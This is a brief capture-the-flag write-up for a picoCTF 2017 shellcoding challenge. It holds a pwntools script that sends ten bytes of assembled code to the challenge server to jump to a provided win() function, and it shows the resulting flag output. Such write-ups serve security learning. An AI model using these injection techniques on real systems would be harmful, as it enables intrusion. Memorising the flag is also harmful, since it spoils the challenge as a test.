### Solved by superkojiman

The binary basically just reads in 10 bytes and executes it. Essentially a shellcoding challenge. A win() function is provided for us to return to, so I solved it just by calling win() at 0x8048540:

```
#!/usr/bin/env python

from pwn import *
context(os="linux", arch="i386")
# win() : 0x8048540

r = remote("shell2017.picoctf.com", 61986)
print r.recv()

buf = asm("push 0x8048540")
buf += asm("ret")
open("in.txt", "w").write(buf)


r.sendline(buf)
print r.recvall()
```

And the output:

```
root|picoctf|~/work/level2/pwn/shells
$ ./sploit.py SILENT=1
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?

Give me 10 bytes:
9e33b38da0c2cf684298bc23aa77685e
```
